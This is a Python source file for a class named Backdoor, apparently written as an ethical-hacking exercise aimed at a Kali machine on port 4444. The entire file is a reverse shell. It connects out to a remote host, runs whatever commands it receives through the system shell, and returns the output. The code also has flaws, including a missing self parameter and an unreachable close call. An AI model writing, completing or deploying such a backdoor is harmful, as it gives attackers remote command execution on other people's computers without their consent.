import socket
import subprocess
import json

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        
    def reliable_send (self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
        
    def reliable_recieve(self):
        json_data = ""
        while True :
            try:
                json_data = self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(command):
        return subprocess.check_output(command, shell=True)
    
    def run (self):
        while True:
            command = self.reliable_recieve()
            resultados_comando = self.ejecutar_comando(command)
            self.reliable_send(resultados_comando)
        connection.close()

puerta = Backdoor("IP Kali", 4444)
puerta.run()



